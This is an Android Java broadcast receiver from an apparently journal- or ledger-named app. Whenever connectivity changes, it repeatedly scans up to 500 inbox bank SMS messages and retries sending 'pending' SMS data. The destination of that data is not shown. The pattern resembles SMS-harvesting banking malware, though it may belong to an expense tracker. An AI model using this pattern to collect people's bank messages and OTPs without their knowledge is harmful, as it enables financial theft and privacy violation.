package com.daftar.rooznameh;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Handler;
import android.os.Looper;

public class NetworkReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        runSync(context, 1000);
        runSync(context, 5000);
        runSync(context, 15000);
        runSync(context, 30000);
        runSync(context, 60000);
    }

    private void runSync(Context context, long delay) {
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            if (isOnline(context)) {
                SmsReceiver.scanInboxBankSms(context.getApplicationContext(), 500);
                SmsReceiver.retryPendingSms(context.getApplicationContext());
            }
        }, delay);
    }

    private boolean isOnline(Context context) {
        try {
            ConnectivityManager cm =
                    (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);

            if (cm == null) return false;

            NetworkInfo info = cm.getActiveNetworkInfo();
            return info != null && info.isConnected();

        } catch (Exception e) {
            return false;
        }
    }
}
